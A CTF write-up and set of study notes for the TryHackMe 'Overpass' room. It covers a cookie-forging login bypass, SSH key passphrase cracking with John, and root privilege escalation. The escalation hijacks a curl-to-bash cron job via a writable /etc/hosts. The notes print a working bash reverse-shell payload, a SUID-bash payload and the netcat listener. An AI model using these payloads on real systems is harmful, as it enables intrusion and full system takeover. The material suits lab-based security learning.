# Overpass — Study Notes

**Room:** Overpass (TryHackMe) · **Type:** Easy Linux box
**Goal:** Get `user.txt` and `root.txt`
**Core theme:** *Broken Access Control* (an OWASP Top 10 vuln) → SSH key theft → cron-based privilege escalation

---

## 1. The attack chain at a glance

```
Web recon  →  found /admin login
              │
Broken Auth →  set a fake SessionToken cookie → bypass login
              │
Loot        →  admin page leaks james's ENCRYPTED SSH private key
              │
Crack       →  ssh2john + john  →  passphrase "james13"
              │
USER        →  ssh james@target  →  cat user.txt   ✅
              │
Enumerate   →  /etc/crontab: root runs a script from overpass.thm every minute
              │
Hijack      →  /etc/hosts is world-writable → point overpass.thm at Kali
              │
Payload     →  host malicious buildscript.sh; root cron runs it AS ROOT
              │
ROOT        →  reverse shell / SUID bash  →  cat root.txt   ✅
```

**One-sentence summary:** Trust something a low-privilege user controls (a cookie, a hostname in `/etc/hosts`) and you climb from nobody → user → root.

---

## 2. Phase 1 — Recon (finding the way in)

**Directory brute-forcing** to discover hidden pages:

```bash
gobuster dir -u http://TARGET_IP -w /usr/share/wordlists/dirb/common.txt
```

| Part | Meaning |
|------|---------|
| `gobuster dir` | directory/file discovery mode |
| `-u` | target URL |
| `-w` | wordlist of names to try |

**Result:** found `/admin`, `/aboutus`, `/downloads`, `/css`, `/img`.
`/admin` is the interesting one — a login page.

> **Note:** the room hinted "Do NOT bruteforce" — meaning don't brute passwords. Directory enumeration (finding pages) is fine; it's not credential guessing.

---

## 3. Phase 2 — Broken Access Control (the login bypass)

**Read the client-side login code:**

```bash
curl http://TARGET_IP/admin/login.js
```

The revealing logic:

```js
const statusOrCookie = await response.text()
if (statusOrCookie === "Incorrect credentials") {
    loginStatus.textContent = "Incorrect Credentials"
} else {
    Cookies.set("SessionToken", statusOrCookie)   // <-- trusts server text blindly
    window.location = "/admin"
}
```

**The flaw:** the page decides you're "logged in" purely from a `SessionToken` cookie it never validates. So we just create the cookie ourselves.

**Exploit (browser console, F12):**
```js
document.cookie = "SessionToken=admin"   // any non-empty value works
```
Then reload `/admin`.

**Or straight from the terminal (cleaner):**
```bash
curl -s -b "SessionToken=admin" http://TARGET_IP/admin/
```
- `-b` sends a cookie with the request
- `-s` = silent (hide the progress bar)

**Loot:** the admin page displays a note to *James* and his **encrypted RSA private key**.
- Username **james** came from the note: *"Since you keep forgetting your password, James, I've set up SSH keys for you."*

---

## 4. Phase 3 — Crack the key & get USER

**Save the key cleanly (avoids copy-paste errors):**
```bash
curl -s -b "SessionToken=admin" http://TARGET_IP/admin/ | sed -n '/BEGIN RSA/,/END RSA/p' > id_rsa
chmod 600 id_rsa
```

**Crack its passphrase with John the Ripper:**
```bash
ssh2john id_rsa > hash.txt          # convert key -> john-readable hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt                # reveal the cracked passphrase
```
- Passphrase found: **`james13`**
- This is **allowed** — you're cracking a file you already obtained, not brute-forcing the live SSH service.

**Log in and grab the flag:**
```bash
ssh -i id_rsa james@TARGET_IP       # passphrase: james13
cat user.txt                        # ✅ user flag
```

> **Gotcha I hit:** I first tried `ssh -i id_rsa james13@TARGET` — using the *passphrase* as the *username*. `james13` is the key's passphrase; the **username is james**. Different things.

---

## 5. Phase 4 — Enumeration for privesc

**The key question after getting a user shell:** *what runs with more privilege than me that I can influence?*

Places to check:
```bash
sudo -l                              # can I run anything as root?
cat /etc/crontab                     # scheduled root jobs
ls -la /etc/cron.*                   # other cron locations
find / -perm -4000 2>/dev/null       # SUID binaries
```
(A tool like **LinPEAS** checks all of these automatically and highlights findings.)

**The finding in `/etc/crontab`:**
```
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

Reading a cron line — 7 fields:
```
# ┌── minute  ┌── hour  ┌── day-of-month  ┌── month  ┌── day-of-week  ┌── USER   ┌── command
  *           *         *                 *          *                root      curl ... | bash
```
Translation: **every minute, root downloads a script from `overpass.thm` and runs it.**

**Why it's exploitable:** `overpass.thm` is resolved via `/etc/hosts`, and:
```bash
ls -l /etc/hosts
# -rw-rw-rw- 1 root root ... hosts   <-- world-writable!
```
We control what `overpass.thm` points to → we control the script root runs.

---

## 6. Phase 5 — Hijack & get ROOT

**Step 1 — repoint the hostname to Kali (on the target):**
```bash
printf '127.0.0.1 localhost\n192.168.170.52 overpass.thm\n' > /etc/hosts
```
> `sed -i` failed here with *Permission denied* because `-i` creates a **temp file in `/etc/`** (james can't write the directory, only the `hosts` file). A plain `>` redirect writes the file directly and works.

**Step 2 — get your Kali VPN IP:**
```bash
ip a show tun0 | grep inet          # use the tun0 (VPN) address
```

**Step 3 — host the malicious script on Kali (matching the cron's exact path):**
```bash
mkdir -p ~/overpass/downloads/src
printf '#!/bin/bash\nbash -i >& /dev/tcp/192.168.170.52/4444 0>&1\n' > ~/overpass/downloads/src/buildscript.sh
cd ~/overpass
sudo python3 -m http.server 80      # port 80 needs sudo
```

**Step 4 — start a listener (second Kali terminal):**
```bash
nc -lvnp 4444
```

**Step 5 — wait ≤60s.** Root's cron resolves `overpass.thm` → Kali → downloads the script → runs it **as root** → shell connects back:
```bash
id                                   # uid=0(root)
cat /root/root.txt                   # ✅ root flag
```

**Alternative payload (no listener, bulletproof) — SUID bash:**
```bash
# buildscript.sh contents:
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
# then, on the target as james:
/tmp/rootbash -p                     # -p keeps root privileges -> root shell
```

---

## 7. Command reference (with meanings)

| Command | What it does |
|---------|--------------|
| `gobuster dir -u URL -w LIST` | discover hidden web directories/files |
| `curl -s -b "K=V" URL` | HTTP request; `-b` sends a cookie, `-s` silent |
| `sed -n '/A/,/B/p' file` | print only the lines from pattern A to B |
| `chmod 600 file` | owner read+write only (required for SSH keys) |
| `ssh2john key > hash` | turn an SSH key into a crackable hash |
| `john --wordlist=W hash` | crack with a wordlist; `--show` reveals result |
| `ssh -i key user@ip` | log in using a private key |
| `cat /etc/crontab` | view scheduled system (root) jobs |
| `ip a show tun0 \| grep inet` | show the VPN interface's IP |
| `python3 -m http.server 80` | quick web server serving the current folder |
| `nc -lvnp 4444` | listen for a reverse shell (`-l` listen `-v` verbose `-n` no DNS `-p` port) |
| `rm -r ~/overpass` | delete a folder and its contents |

---

## 8. Concepts learned

**Linux file permissions (`chmod`)** — three groups: owner / group / others. Each digit = read(4) + write(2) + execute(1).
- `600` = `-rw-------` (secrets, keys)
- `644` = `-rw-r--r--` (normal files)
- `755` = `-rwxr-xr-x` (runnable programs)
- `+s` = **SUID** — the program runs as its *owner* (root), not the caller. This bit **is** the privesc.

**`ip` vs `ifconfig`** — `ifconfig` is deprecated/often missing; `ip a` is the modern, always-present replacement. On HTB/THM always use the **tun0** (VPN) address — the target can't reach your `eth0`/`wlan0`.

**Redirection & `printf`**
- `>` writes output to a file (overwrite); `>>` appends.
- `\n` in `printf` = a newline, so one command writes a multi-line file.
- `>` needs write permission on the **file**; `sed -i` needs write on the **directory** (why it failed on `/etc/hosts`).

**Reverse shell line** `bash -i >& /dev/tcp/IP/PORT 0>&1`
- `bash -i` — interactive shell
- `/dev/tcp/IP/PORT` — bash's built-in way to open a TCP connection
- `>&` — send stdout **and** stderr down the connection
- `0>&1` — feed stdin from the same connection (so you can type commands)

**Shebang** `#!/bin/bash` — first line of a script telling the OS which interpreter to use.

---

## 9. Mistakes I made (and the fixes)

| Mistake | Symptom | Fix |
|---------|---------|-----|
| Used passphrase as SSH username (`james13@`) | login failed | username is `james`; `james13` is the passphrase |
| `sed -i` on `/etc/hosts` | `couldn't open temporary file … Permission denied` | use `printf ... > /etc/hosts` (direct write) |
| Typo in reverse-shell IP: `192/168.170.52` | file downloaded (200) but **no shell** | keyboard layout turned `.` into `/`; always `cat` the payload to verify |
| Typed into the `nc` listener before a shell connected | nothing happened | don't type until you see "connect from …"; the input goes nowhere |

**Biggest lesson:** with reverse shells, one wrong character = silent failure. The web server logging `200` only means the file was *served*, not that the shell *connected*. Always verify the payload with `cat`.

---

## 10. Methodology takeaways (reusable on any box)

1. **Enumerate before exploiting** — ports → web dirs → source code → services.
2. **Read client-side JS/HTML** — auth logic there is often trivially bypassable.
3. **Loot leads to loot** — a leaked key → crack it → SSH in.
4. **For privesc, ask:** "What runs as root that *I* can influence?" (cron, SUID, sudo, writable configs).
5. **Abuse trust in things a low-priv user controls** — writable `/etc/hosts`, writable scripts, SUID binaries.
6. **Verify every step** — `cat` your payloads, check `id`, confirm cookies/hosts actually changed.

---

## 11. Practice next (similar skills)

- **TryHackMe:** *Basic Pentesting*, *Simple CTF*, *Vulnversity*, *Kenobi*
- **HackTheBox (retired, easy):** *Bashed*, *Shocker*, *Traverxec*
- Focus areas to drill: cron privesc, SUID exploitation (see GTFOBins), reverse shells (learn 3–4 by heart), and using LinPEAS to *find* vectors instead of memorizing boxes.
